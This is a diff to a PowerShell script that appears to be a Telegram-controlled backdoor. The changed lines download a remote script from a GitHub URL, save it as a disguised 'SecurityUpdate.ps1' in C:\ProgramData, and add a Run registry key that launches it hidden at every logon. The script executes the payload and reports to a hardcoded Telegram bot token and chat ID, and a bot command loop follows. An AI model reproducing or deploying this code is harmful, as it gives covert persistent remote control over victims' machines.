@@ -16,7 +16,7 @@ BOT TELEGRAM:
 
 $BotToken = "1703588475:AAEyrNt2cuj-u6hWO8t3_NIbKLFVQyMDwNE"
 $ChatID = '928905258'
-$githubScript = 'https://raw.githubusercontent.com/halitAKAYDIN/PSBoTelegram/master/poc.ps1'
+$persistPath = 'https://raw.githubusercontent.com/halitAKAYDIN/halitAKAYDIN.github.io/master/download/SpaceSec_Bot.ps1'
 #$runPath= pwd + 'SecurityUpdate.ps1'
 
 
@@ -24,14 +24,14 @@ function Persist {
         reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /f
         
         #Send-Message "Downloading.."
-        Invoke-WebRequest -Uri $persistPath -OutFile $ENV:UserProfile\SecurityUpdate.ps1
+        Invoke-WebRequest -Uri $persistPath -OutFile C:\ProgramData\SecurityUpdate.ps1
         
-		    reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file $ENV:UserProfile\SecurityUpdate.ps1"
+		    reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\ProgramData\SecurityUpdate.ps1"
 
         $checkPersist = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String SecurityUpdate
         Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkPersist)" -UserAgent Edge -UseBasicParsing
 		
-        $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\SecurityUpdate.ps1"
+        $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\ProgramData\SecurityUpdate.ps1"
         Invoke-Expression -Command:$command
         #(get-item "C:\Users\$env:username\SecurityUpdate.ps1" -force).Attributes -= 'Hidden'
 }
@@ -335,7 +335,7 @@ While ($DoNotExit)  {
 	    #The message sent is unknown
 		    #$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
 		    #$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html" -UserAgent Edge -UseBasicParsing
-        	}
+        }
 	  }
 	}
 }
